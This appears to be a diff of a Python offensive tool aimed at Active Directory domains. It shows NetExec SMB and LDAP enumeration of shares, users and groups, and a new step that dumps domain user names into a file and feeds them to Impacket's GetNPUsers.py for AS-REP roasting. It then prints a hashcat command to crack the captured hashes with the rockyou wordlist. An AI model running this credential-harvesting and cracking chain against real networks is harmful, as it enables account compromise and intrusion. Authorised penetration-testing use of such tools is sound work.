@@ -64,9 +64,8 @@ def run():
     if c in ("2","A"):
         run_cmd(f"{cme} --shares")
         run_cmd(f"{cme} --users")
-        run_cmd(f"{cme} --groups")
-        run_cmd(f"{cme} --smb-sessions")
-        run_cmd(f"{cme} --loggedon-users")
+        cme_ldap = f"nxc ldap {shell_quote(dc)} {nxc_a}"
+        run_cmd(f"{cme_ldap} --groups")
 
     if c in ("3","A"):
         out = run_cmd(f"{ldap_b} '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath", capture=True)
@@ -88,6 +87,7 @@ def run():
             warn("Skipping Kerberoast SPN collection: credentials are required.")
 
     if c in ("7","A"):
+        run_cmd(f"nxc smb {dc} -u {user} -p {pw} -d {dom} --users | awk '/SMB/{{print $5}}' | grep -v '-' | grep -v '\\*' | tail -n +2 > /tmp/users.txt")
         run_cmd(f"{imp('GetNPUsers.py')} {dom}/ -dc-ip {dc} -no-pass -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep.txt")
         info("Crack: hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt")
 
